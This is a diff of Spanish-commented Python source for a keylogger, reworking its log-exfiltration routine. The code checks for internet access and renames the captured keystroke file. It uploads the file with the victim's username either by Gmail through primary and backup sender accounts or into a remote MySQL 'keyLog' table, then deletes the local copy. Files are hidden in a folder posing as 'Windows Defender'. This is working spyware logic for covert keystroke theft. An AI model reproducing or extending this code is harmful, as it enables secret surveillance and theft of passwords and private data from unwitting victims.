@@ -284,7 +284,6 @@ def CreateDir():
 
 # Intervalo de tiempo que se enviará el archivo reg.k
 def SendLog():
-
     # Función = Verifica si hay conexión a internet para poder envíar el log
     def VerificarConexion():
         con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
@@ -331,21 +330,26 @@ def SendLog():
             print("Error al iniciar sesión [DataBase]")
 
         def UpdateUser():
-            f = open (logKeyPath()+LogName(),'r')
+            pathO = logKeyPath()+ LogName()
+            pathN = logKeyPath()+ "db.txt"
+            os.rename(pathO, pathN)
+            # Abre el archivo
+            f = open (pathN ,'r')
             data = f.read()
             print(data)
-            f.close()
-
+            # Tiempo
             T = datetime.datetime.now()
             currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
             sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
             #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
+
+            f.close()
             try:
                 cursor.execute(sql) # Ejecuta virtual
                 connection.commit() # Se guardan virtual 
                 print("[Database] Se subieron los datos correctamente")
                     # Elimina Registro Key
-                os.remove(logKeyPath()+LogName())
+                os.remove(pathN)
             except:
                 print("[Database] Error al subir los datos")
 
@@ -360,37 +364,27 @@ def SendLog():
         if VerificarConexion():
             if (GMailOrDataBase() == 0):    # Send mail
                 n = n+1
-                
-                
-                pass
+                # Crea nombre del archivo
+                nameFile = str(getuser())+" "+str(n)+".txt"
+                #Renombra el archivo original
+                Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`
+
+                #Envía el archivo renombrado
+                CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+                homedir = logKeyPath()+str(nameFile)
+
+                print("[Gmail send] Proceso de envío...")
+
+                if SendGmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
+                    #Si se envíó correctamente, pues elimina el archivo
+                    os.remove(homedir)
+                elif SendGmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
+                    os.remove(homedir)
+
             if (GMailOrDataBase() == 1):    # Send Data Base
                 SendDataBaseMySQL()
         else:
-            print("[Send Log Key] sin conexión")
-
-
-
-        if VerificarConexion(): # Continua solo si hay conexión a internet
-            # Crea nombre del archivo
-            nameFile = str(getuser())+" "+str(n)+".txt"
-            #Renombra el archivo original
-            Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`
-
-            #Envía el archivo renombrado
-            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-            homedir = logKeyPath()+str(nameFile)
-
-            print("Proceso de envío")
-
-            if SendGmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
-                #Si se envíó correctamente, pues elimina el archivo
-                os.remove(homedir)
-            elif SendGmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
-                os.remove(homedir)
-        else:   # No hay conexión
-            # Seguirá sobreescribiendo el archivo   # Verificar pruba de errores
-            # No hará nada, y esperará que haya una conexión exitosa
-            pass     
+            print("[Send] sin conexión")
 
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
